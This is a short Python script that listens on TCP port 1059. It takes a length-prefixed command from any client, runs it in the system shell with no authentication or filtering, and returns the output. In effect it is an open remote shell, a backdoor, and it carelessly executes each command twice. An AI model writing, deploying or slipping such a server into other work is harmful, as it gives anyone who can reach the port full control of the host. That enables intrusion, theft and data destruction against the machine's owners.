import socket
import struct
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((socket.gethostname(), 1059))
s.listen()

while True:
    connection, address = s.accept()
    try:
        print(f"Connected to {address} established!")

        leng = connection.recv(2)
        leng = struct.unpack("!H", leng)[0]
        cmd = ""
        for i in range(leng):
            msg = connection.recv(1)
            msg = msg.decode( "ascii")
            cmd += msg
        print(cmd)
        os.system(cmd)
        txt = os.popen(cmd).read()
        # print(txt)

        connection.send(struct.pack("!H", len(txt)))
        connection.send(bytes(txt, "ascii"))

    finally:
        connection.close()



